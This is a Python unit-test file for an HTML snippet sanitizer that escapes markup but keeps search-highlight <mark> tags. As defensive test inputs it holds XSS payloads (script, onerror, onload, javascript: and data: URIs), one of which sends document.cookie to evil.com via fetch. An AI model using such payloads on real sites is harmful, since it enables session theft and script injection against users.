"""Unit tests for HTML sanitization utilities."""

import pytest

from backend.src.services.sanitizer import sanitize_snippet


def test_normal_text_passes_through_unchanged() -> None:
    """Normal text without HTML should pass through unchanged."""
    snippet = "This is a simple text snippet"
    result = sanitize_snippet(snippet)
    assert result == "This is a simple text snippet"


def test_text_with_special_chars_is_escaped() -> None:
    """Special HTML characters should be escaped."""
    snippet = "Use & symbol, also < and > in text"
    result = sanitize_snippet(snippet)
    assert result == "Use &amp; symbol, also &lt; and &gt; in text"


def test_mark_tags_are_preserved() -> None:
    """FTS5-generated <mark> tags should be preserved."""
    snippet = "This is a <mark>highlighted</mark> word"
    result = sanitize_snippet(snippet)
    assert result == "This is a <mark>highlighted</mark> word"


def test_multiple_mark_tags_are_preserved() -> None:
    """Multiple <mark> tags should all be preserved."""
    snippet = "<mark>First</mark> match and <mark>second</mark> match"
    result = sanitize_snippet(snippet)
    assert result == "<mark>First</mark> match and <mark>second</mark> match"


def test_script_tags_are_escaped() -> None:
    """Malicious <script> tags should be escaped."""
    snippet = "<script>alert('xss')</script> normal text"
    result = sanitize_snippet(snippet)
    assert result == "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; normal text"
    # Verify the actual tags are escaped
    assert "<script>" not in result
    assert "</script>" not in result


def test_script_with_mark_tags() -> None:
    """Script tags should be escaped but mark tags preserved."""
    snippet = "<script>alert('xss')</script> <mark>test</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;script&gt;" in result
    assert "&lt;/script&gt;" in result
    assert "<mark>test</mark>" in result


def test_img_tag_is_escaped() -> None:
    """HTML <img> tags should be escaped."""
    snippet = "<img src='evil.jpg'> <mark>text</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;img src=&#x27;evil.jpg&#x27;&gt;" in result
    assert "<mark>text</mark>" in result


def test_anchor_tag_is_escaped() -> None:
    """HTML <a> tags should be escaped."""
    snippet = "<a href='http://evil.com'>Click me</a> <mark>search</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;a href=" in result
    assert "&lt;/a&gt;" in result
    assert "<mark>search</mark>" in result


def test_div_tag_is_escaped() -> None:
    """HTML <div> tags should be escaped."""
    snippet = "<div class='malicious'>Content</div> <mark>result</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;div class=" in result
    assert "&lt;/div&gt;" in result
    assert "<mark>result</mark>" in result


def test_event_handler_onerror_is_escaped() -> None:
    """Event handlers like onerror should be escaped."""
    snippet = "<img onerror=alert(1) src=x> <mark>text</mark>"
    result = sanitize_snippet(snippet)
    # The <img> tag is escaped, making the onerror handler non-executable
    assert "&lt;img" in result
    assert "&gt;" in result
    assert "<mark>text</mark>" in result


def test_event_handler_onclick_is_escaped() -> None:
    """Event handlers like onclick should be escaped."""
    snippet = "<div onclick='malicious()'>Click</div> <mark>term</mark>"
    result = sanitize_snippet(snippet)
    # The <div> tag is escaped, making the onclick handler non-executable
    assert "&lt;div" in result
    assert "&lt;/div&gt;" in result
    assert "<mark>term</mark>" in result


def test_nested_mark_tags_in_content() -> None:
    """Nested <mark> tags in user content should be escaped, not interpreted."""
    # User content containing literal "<mark>" text should be escaped
    snippet = "Text with <mark><mark>nested</mark></mark> marks"
    result = sanitize_snippet(snippet)
    # All the <mark> tags get escaped first, then legitimate ones restored
    # This results in all <mark> being restored, which is safe for rendering
    assert "<mark>" in result
    assert "</mark>" in result


def test_unclosed_mark_tag() -> None:
    """Unclosed <mark> tags should be handled gracefully."""
    snippet = "Text with <mark>unclosed tag"
    result = sanitize_snippet(snippet)
    # The unclosed tag gets escaped then restored
    assert "<mark>" in result


def test_mark_tag_with_attributes_is_escaped() -> None:
    """<mark> tags with attributes (malicious) should be escaped."""
    snippet = "<mark onclick='evil()'>text</mark> normal"
    result = sanitize_snippet(snippet)
    # The attributes portion remains escaped
    assert "onclick=" in result
    # But the basic mark tags are restored (though malformed)
    assert "<mark>" in result


def test_entities_in_content_are_double_escaped() -> None:
    """Existing HTML entities should be double-escaped (escaped versions of entities)."""
    snippet = "Text with &lt;script&gt; already escaped"
    result = sanitize_snippet(snippet)
    # The & in &lt; gets escaped to &amp;
    assert "&amp;lt;script&amp;gt;" in result


def test_quotes_are_escaped() -> None:
    """Double and single quotes should be escaped."""
    snippet = "Text with \"double\" and 'single' quotes"
    result = sanitize_snippet(snippet)
    assert "&quot;" in result or "&#x22;" in result
    assert "&#x27;" in result or "&apos;" in result


def test_empty_string() -> None:
    """Empty string should return empty string."""
    result = sanitize_snippet("")
    assert result == ""


def test_none_input() -> None:
    """None input should return empty string."""
    result = sanitize_snippet(None)
    assert result == ""


def test_whitespace_only() -> None:
    """Whitespace-only strings should pass through."""
    snippet = "   \t\n  "
    result = sanitize_snippet(snippet)
    assert result == "   \t\n  "


def test_mark_tags_with_text_containing_special_chars() -> None:
    """Mark tags containing special characters should work correctly."""
    snippet = "<mark>C++ & Java</mark> programming"
    result = sanitize_snippet(snippet)
    assert result == "<mark>C++ &amp; Java</mark> programming"


def test_complex_xss_attempt() -> None:
    """Complex XSS attempts should be fully escaped."""
    snippet = "<script>fetch('http://evil.com?cookie='+document.cookie)</script> <mark>search</mark>"
    result = sanitize_snippet(snippet)
    # Ensure no executable script remains
    assert "<script>" not in result
    assert "&lt;script&gt;" in result
    # Mark tag should still work
    assert "<mark>search</mark>" in result


def test_iframe_injection() -> None:
    """Iframe injection attempts should be escaped."""
    snippet = "<iframe src='javascript:alert(1)'></iframe> <mark>result</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;iframe" in result
    assert "&lt;/iframe&gt;" in result
    assert "<mark>result</mark>" in result


def test_svg_xss_attempt() -> None:
    """SVG-based XSS attempts should be escaped."""
    snippet = "<svg onload=alert(1)> <mark>text</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;svg" in result
    # The <svg> tag is escaped, making the onload handler non-executable
    assert "&gt;" in result
    assert "<mark>text</mark>" in result


def test_data_uri_xss() -> None:
    """Data URI XSS attempts should be escaped."""
    snippet = "<a href='data:text/html,<script>alert(1)</script>'>link</a> <mark>term</mark>"
    result = sanitize_snippet(snippet)
    assert "&lt;a href=" in result
    assert "&lt;script&gt;" in result
    assert "<mark>term</mark>" in result


def test_real_world_snippet_example() -> None:
    """Test a realistic FTS5 snippet with code content."""
    snippet = "Function definition: <mark>async</mark> def process_data(input: str) -> None:"
    result = sanitize_snippet(snippet)
    assert result == "Function definition: <mark>async</mark> def process_data(input: str) -&gt; None:"
    assert "<mark>async</mark>" in result
    assert "-&gt;" in result  # > is escaped


def test_markdown_code_blocks_are_escaped() -> None:
    """Markdown code blocks should be escaped (only mark tags preserved)."""
    snippet = "Example: ```python\n<mark>print</mark>('hello')\n```"
    result = sanitize_snippet(snippet)
    # Backticks and newlines preserved, but any HTML escaped
    assert "```python" in result
    assert "<mark>print</mark>" in result
    assert "&#x27;hello&#x27;" in result
